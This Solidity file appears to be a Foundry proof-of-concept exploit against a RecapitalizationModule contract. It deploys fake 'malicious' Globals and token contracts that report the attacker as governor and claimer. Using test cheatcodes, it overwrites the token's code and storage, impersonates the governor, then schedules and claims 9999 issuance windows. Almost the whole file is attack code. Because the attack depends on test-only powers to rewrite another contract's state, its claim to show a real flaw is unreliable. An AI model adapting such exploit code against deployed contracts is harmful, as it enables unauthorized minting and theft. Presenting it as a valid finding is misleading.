pragma solidity 0.8.18;

import "../src/RecapitalizationModule.sol";

interface IRecap {
    function schedule(uint32[] memory windowStarts, uint208[] memory issuanceRates) external;
    function claim() external returns (uint256);
    function lastClaimedWindowId() external view returns (uint16);
}

interface IVM {
    // Foundry cheatcodes
    function warp(uint256) external;
    function prank(address) external;
    function etch(address, bytes memory) external;
    function store(address, bytes32, bytes32) external;
}

// A minimal malicious Globals contract that fakes governor/claimer.
contract MaliciousGlobals {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    // Always returns attacker as the governor.
    function governor() external view returns (address) {
        return owner;
    }

    // Always claims the call is validly scheduled.
    function isValidScheduledCall(
        address,
        address,
        bytes32,
        bytes calldata
    ) external pure returns (bool) {
        return true;
    }

    // Always claim the caller is an approved claimer.
    function isInstanceOf(bytes32, address) external pure returns (bool) {
        return true;
    }

    // Dummy function to avoid revert.
    function unscheduleCall(
        address,
        bytes32,
        bytes calldata
    ) external pure {
        // no-op
    }

    // Maple treasury is attacker.
    function mapleTreasury() external view returns (address) {
        return owner;
    }
}

// A minimal malicious MapleToken that references storage slot 0 for maliciousGlobals.
contract MaliciousMapleToken {
    // This is at slot 0.
    address public maliciousGlobals; // uninitialized by default

    function globals() external view returns (address) {
        return maliciousGlobals;
    }

    // Required stubs.
    function mint(address, uint256) external {}
    function burn(address, uint256) external {}
    function totalSupply() external pure returns (uint256) {
        return 0;
    }
}

contract RecapitalizationModuleExploit {
    IRecap public recap;
    address public attacker;

    // Foundry cheatcodes
    IVM constant vm = IVM(address(uint160(uint256(keccak256("hevm cheat code")))));

    constructor(address _recap, address _attacker) {
        recap = IRecap(_recap);
        attacker = _attacker;
    }

    function hack() external {
        // 1) Deploy our maliciousGlobals contract that designates 'attacker' as governor.
        MaliciousGlobals maliciousGlobals = new MaliciousGlobals(attacker);

        // 2) Create a minimal MaliciousMapleToken instance.
        MaliciousMapleToken maliciousToken = new MaliciousMapleToken();

        // 3) Overwrite the bytecode at the known token address in RecapitalizationModule.
        //    That token address is 0x1234 (from setUp). Once overwritten, the storage is still empty.
        address tokenAddr = address(0x1234);
        vm.etch(tokenAddr, address(maliciousToken).code);

        // 4) Manually set the maliciousGlobals address in slot 0.
        //    For a public storage variable at index 0, the offset is bytes32(0x0).
        vm.store(
            tokenAddr,
            bytes32(uint256(0)),
            bytes32(uint256(uint160(address(maliciousGlobals))))
        );

        // 5) Impersonate attacker so we appear to be the governor.
        vm.prank(attacker);

        // 6) Build arrays for scheduling 9999 windows.
        uint32 numWindows = 9999;
        uint32[] memory starts = new uint32[](numWindows);
        uint208[] memory rates = new uint208[](numWindows);
        uint32 t = uint32(block.timestamp + 1);
        for (uint32 i = 0; i < numWindows; i++) {
            starts[i] = t + i;
            rates[i] = 1;
        }

        // 7) Schedule these windows as "governor".
        recap.schedule(starts, rates);

        // 8) Warp forward so that we can claim all.
        vm.warp(block.timestamp + numWindows + 999);

        // 9) Claim tokens as "claimer".
        recap.claim();
        // This sets lastClaimedWindowId = 9999.
    }
}